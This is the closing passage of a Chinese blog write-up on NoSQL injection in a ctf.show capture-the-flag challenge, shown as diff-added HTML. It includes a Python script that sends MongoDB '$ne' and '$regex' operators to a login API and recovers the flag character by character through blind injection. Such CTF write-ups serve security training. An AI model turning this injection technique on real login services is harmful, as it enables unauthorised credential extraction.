+<p>这个时候我们尝试在上题的payload基础上再加个字母</p>
+<p><img src="/blog/2023/08/20/NoSQL%E6%B3%A8%E5%85%A5/image-20230820191239673.png" alt="image-20230820191239673"></p>
+<p>登录失败，那么应该可以进行盲注</p>
+<p>脚本</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests
+string<span class="token operator">=</span><span class="token string">"abcdefghigklmnopqrstuwxyz1230456789&#123;&#125;_-"</span>
+flag<span class="token operator">=</span><span class="token string">'&#123;'</span>
+url<span class="token operator">=</span><span class="token string">"http://271deadc-a024-466a-ab2f-cc617799befb.challenge.ctf.show/api/"</span>
+<span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
+    <span class="token keyword">for</span> j <span class="token keyword">in</span> string<span class="token punctuation">:</span>
+        data<span class="token operator">=</span><span class="token punctuation">&#123;</span>
+            <span class="token string">"username[$ne]"</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">,</span>
+            <span class="token string">"password[$regex]"</span><span class="token punctuation">:</span><span class="token string-interpolation"><span class="token string">f"ctfshow</span><span class="token interpolation"><span class="token punctuation">&#123;</span>flag<span class="token operator">+</span>j<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span>
+        <span class="token punctuation">&#125;</span>
+        r<span class="token operator">=</span>requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">)</span>
+        <span class="token keyword">if</span> <span class="token string">"\\u767b\\u9646\\u6210\\u529f"</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">:</span>
+            sign<span class="token operator">=</span>j
+            flag<span class="token operator">+=</span>j
+            <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>
+        <span class="token keyword">else</span><span class="token punctuation">:</span>
+            <span class="token keyword">pass</span>
+    <span class="token keyword">if</span> sign<span class="token operator">==</span><span class="token string">'&#125;'</span><span class="token punctuation">:</span>
+        <span class="token keyword">break</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+    </div>
+    
+    
+    
+    
+    
+    
+    
+</div>
+
+            </div>
+        </transition>
+        
+        <transition name="fade">
+            <div id="preview" ref="preview" v-show="previewShow">
+                <img id="preview-content" ref="previewContent" />
+            </div>
+        </transition>
+        
+    </div>
+    <script src="/blog/js/main.js"></script>
+    
+    
+
+
+
+
+    
+    
+
+<div id="vcomments"></div>
+
+<script src="/blog/js/lib/valine.min.js"></script>
+<script>
+    new Valine({
+        el: '#vcomments',
+        app_id: 'U9mZLKunkRUTcBFthjXPjnZE-9Nh9j0Va',
+        app_key: 'SzWOnY0PWLGNuL6jW8TZYc7j',
+        visitor: 'true',
+        placeholder: '写点什么吧(●ˇ∀ˇ●)',
+        serverURLs: 'https://u9mzlkun.lc-cn-n1-shared.com',
+    });
+</script>
+
+    <footer id="footer">
+    <div id="footer-wrap">
+        <div>
+            &copy;
+            2022 - 2025 雲流のLowest World
+            <span id="footer-icon">
+                <i class="fa-solid fa-font-awesome fa-fw"></i>
+            </span>
+            &commat;C1oudfL0w0
+        </div>
+        <div>
+            Based on the <a target="_blank" rel="noopener" href="https://hexo.io">Hexo Engine</a> &amp;
+            <a target="_blank" rel="noopener" href="https://github.com/argvchs/hexo-theme-particlex">ParticleX Theme</a>
+        </div>
+        
+    </div>
+</footer>
+
+<script src="/blog/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"model":{"jsonPath":"/blog/live2dw/assets/z16.model.json"},"display":{"position":"left","width":150,"height":290},"mobile":{"show":false},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+
+</html>
